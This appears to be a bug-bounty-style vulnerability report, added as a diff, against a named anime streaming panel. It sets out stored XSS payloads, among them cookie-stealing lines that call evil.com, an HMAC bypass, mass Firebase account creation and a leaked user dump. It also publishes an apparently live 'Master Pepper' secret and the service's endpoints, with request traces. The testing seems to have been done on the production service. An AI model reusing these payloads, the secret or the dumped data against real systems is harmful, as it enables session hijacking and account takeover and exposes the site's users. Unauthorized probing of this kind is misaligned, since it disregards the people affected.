@@ -1,0 +1,154 @@
+# MikuNime — Vulnerability Report
+
+**Target:** `panel.mikunime.web.id`
+**Date:** 2026-09-12
+**Researcher:** CodersTeam - BugEXPO
+**Stack:** Laravel (PHP) + Firebase Auth + Native ARM64 (`libmiku.so`)
+
+---
+
+## Critical Findings
+
+### 1. Stored XSS in Global Chat (High)
+**Endpoint:** `POST /api/v1/global-chats`
+**PoC:**
+```json
+{"message": "<script>alert(document.cookie)</script>"}
+```
+All payloads accepted without sanitization — `<script>`, `<img onerror>`, `<svg onload>`, `<iframe javascript:>` all stored and returned to every user.
+
+Verified payloads stored:
+- `<script>alert(1)</script>`
+- `<script>document.location="http://evil.com/?c="+document.cookie</script>`
+- `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">`
+- `<svg/onload=fetch('http://evil.com/'+document.cookie)>`
+- `<iframe src="javascript:alert(document.domain)">`
+- `{{constructor.constructor("return this")()}}`
+
+**Impact:** Session hijack for all connected users, account takeover, phishing.
+
+### 2. v1 API Bypasses HMAC Integrity Check (High)
+**Finding:** The `/api/v1/*` endpoints accept requests with only a Firebase JWT — the HMAC signature (`X-Miku-Signature`, `X-Miku-Timestamp`, `X-Miku-Nonce`) is NOT validated on v1 routes.
+
+The `/api/miku/7/9/*` endpoints correctly enforce HMAC validation (returns `INVALID_SIGNATURE`), but `/api/v1/*` does not.
+
+**Impact:** Any attacker with a Firebase account can access all API functionality without the native signing library.
+
+### 3. Unrestricted Firebase Auth Account Creation (Medium)
+**Endpoint:** `POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBPi[REDACTED]`
+**PoC:**
+```json
+{"email": "any@email.com", "password": "any123", "returnSecureToken": true}
+```
+No email verification, no rate limiting. Created 10+ accounts freely.
+
+**Impact:** Mass account creation for abuse, API key exhaustion.
+
+---
+
+## Medium Findings
+
+### 4. User PII Leaked via Leaderboard (Medium)
+**Endpoint:** `GET /api/v1/leaderboard?type=xp&limit=100`
+
+54 unique users leaked including:
+- Firebase UIDs
+- Usernames
+- XP / Level
+- Google profile photos (email-linked)
+- CDN avatar URLs
+
+Full dump saved: `mikunime_users_dump.json`
+
+### 5. Firebase API Key Exposed in APK (Medium)
+**Key:** `AIzaSyBPi[REDACTED]`
+**Project:** `komen-1ee45`
+**RTDB:** `https://komen-1ee45-default-rtdb.asia-southeast1.firebasedatabase.app`
+
+Hardcoded in the APK's `libmiku.so` and `classes2.dex`.
+
+### 6. Scraper API Fully Unauthenticated (Medium)
+**Endpoints:**
+- `GET /api/v1/v2/2/3/genre.php` — 33 genres
+- `GET /api/v1/v2/2/3/search.php?q=*` — full search
+- `GET /api/v1/v2/2/3/jadwal.php?day=*` — weekly schedule
+
+No auth required. Full content scraping possible.
+
+---
+
+## Low Findings
+
+### 7. Server Path Disclosure (Low)
+Laravel error responses leak full paths:
+```
+/root/MikuNimeNative/backend-laravel/vendor/laravel/framework/src/Illuminate/Routing/AbstractRouteCollection.php
+```
+
+### 8. CORS Wildcard (Low)
+```
+Access-Control-Allow-Origin: *
+Access-Control-Expose-Headers: *
+```
+Any origin can read API responses.
+
+---
+
+## Informational
+
+### 9. Encrypted Session Cookies
+`XSRF-TOKEN` and `mikunime_session` use Laravel encrypted cookies. If `APP_KEY` is compromised, session forgery is possible.
+
+### 10. Rate Limit Visible
+`X-RateLimit-Limit: 180` / `X-RateLimit-Remaining: 179` exposed in headers.
+
+---
+
+## Extracted Secrets
+
+| What | Value |
+|------|-------|
+| Master Pepper | `MikuSecureV3_YanzzMasterKey2026_UltraGuard` |
+| Firebase API Key | `AIzaSyBPi[REDACTED]` |
+| Firebase Project | `komen-1ee45` |
+| RTDB URL | `https://komen-1ee45-default-rtdb.asia-southeast1.firebasedatabase.app` |
+| Storage Bucket | `komen-1ee45.firebasestorage.app` |
+| API Endpoint | `https://panel.mikunime.web.id/api/miku/7/9` |
+| Scraper Endpoint | `https://panel.mikunime.web.id/api/v1/v2/2/3` |
+
+---
+
+# EXECUTION TRACE
+
+### XSS in Chat
+```
+POST /api/v1/global-chats
+Authorization: Bearer <firebase_jwt>
+Content-Type: application/json
+
+{"message": "<script>alert(document.cookie)</script>"}
+```
+Response: `200 OK` — payload stored and visible to all users.
+
+### HMAC Bypass
+```
+GET /api/v1/anime
+Authorization: Bearer <firebase_jwt>
+Accept: application/json
+```
+No `X-Miku-Signature` header needed — returns full anime list.
+
+### Account Creation
+```
+POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBPi[REDACTED]
+Content-Type: application/json
+
+{"email": "test@test.com", "password": "test123", "returnSecureToken": true}
+```
+
+---
+
+*Report by CodersTeam - BugEXPO*
+
+---
+*BLACK-STAMPED BY CT-002*
